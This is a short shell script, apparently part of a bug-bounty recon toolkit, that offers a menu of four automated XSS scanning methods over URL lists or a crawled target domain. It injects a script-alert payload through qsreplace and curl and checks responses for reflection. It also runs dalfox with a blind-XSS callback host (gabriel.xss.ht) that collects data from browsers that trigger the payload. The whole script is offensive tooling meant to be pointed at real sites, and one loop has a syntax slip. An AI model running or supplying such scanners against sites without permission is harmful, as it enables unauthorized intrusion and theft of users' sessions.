#xss-----------------------------------------------------------------------------------------





echo	"1. qsreplace_reflected (*.txt)   2. Path_based_XSS (*.txt)   3. dalfox (*.txt)   4. dalfox_Gospider_multiple (urls.txt)"	
	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                echo -n "Enter the file name (*.txt) : "
				read file
                                #Exploit  
                                cat $file | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
 
		;;

	2)
                                echo -n "Enter the file name (*.txt) : "
				read file
				#Exploit
				cat $file | gf xss | while read url; do dir=$(curl -s -L "$url/xss\"><"|grep 'xss"');echo -e "Target:\e[1;33m $url/\"><\e[0m""\n" "\e[1;32m$dir\e[0m"; done
 
                                
		;;
          
	3)
				echo -n "Enter the file name (*.txt) : "
				read file
				#Exploit
                                dalfox file $file -b gabriel.xss.ht 
                                dalfox file $file 

		;;
	
	4)
		echo -n "Enter the Domain (https://target.com) : "
		read domain
             	gospider -s "$domain" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o dalfox_Gospider_xss.txt

                                #move file
                                mv dalfox_Gospider_xss.txt results/xss

		;;
                *)
                        echo "Please give valid choice!!!"
		;;

esac










#xss-----------------------------------------------------------------------------------------
